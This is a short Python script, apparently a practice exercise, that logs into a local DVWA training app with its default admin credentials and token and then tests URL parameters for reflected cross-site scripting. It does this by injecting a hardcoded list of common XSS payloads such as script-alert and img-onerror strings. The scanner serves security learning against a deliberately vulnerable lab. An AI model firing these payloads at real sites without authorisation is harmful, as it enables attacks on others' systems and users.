import requests
from urllib.parse import urlparse, parse_qs, urlencode
import re

# Common xss payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "';alert(1);//",
]

#URL's needed in the script
login_url = "http://localhost/login.php"
dvwa_url = "http://localhost/vulnerabilities/xss_r/?name=test"

# Dictionairy responsible for logiing into DVWA
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

# Function responsible for logging with token
def login(session):
    # Getting session token
    r = session.get(login_url)
    match = re.search(r'user_token\' value=\'([a-z0-9]+)\'', r.text)
    if not match:
        print("[-] No user_token, login wont be possible.")
        return False

    token = match.group(1)
    login_data["user_token"] = token

    # Sending POST request with our token and checking if it worked
    response = session.post(login_url, data=login_data)
    return "DVWA Security" in response.text

# Testing xss vunerability
def test_xss(url, data=None):
    print(f"[*] Target url: {url}")
    vulnerable = False

    #Logging into DVWA
    session = requests.Session()
    if not login(session):
        print("[-] Logging unsuccesfull.")
        return

    #Checking payloads
    for payload in XSS_PAYLOADS:
        #Changig URL to dictionary containing its parameters
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        #Trying XSS for every parameter in the URL
        for param in query:
            #Saving original parameter
            original = query[param][0]
            #Changing parameter to test XSS
            query[param][0] = payload
            #Encoding the payload in URL
            new_query = urlencode(query, doseq=True)
            new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            #Sending get request
            response = session.get(new_url)

            #Checking if payload worked
            if payload in response.text:
                print(f"[!] Posible vunerability '{param}' using payload: {payload}")
                vulnerable = True
       
    #In case we couldn't find anything
    if not vulnerable:
        print("[+] No obvious vunerability.")

test_xss(dvwa_url)
    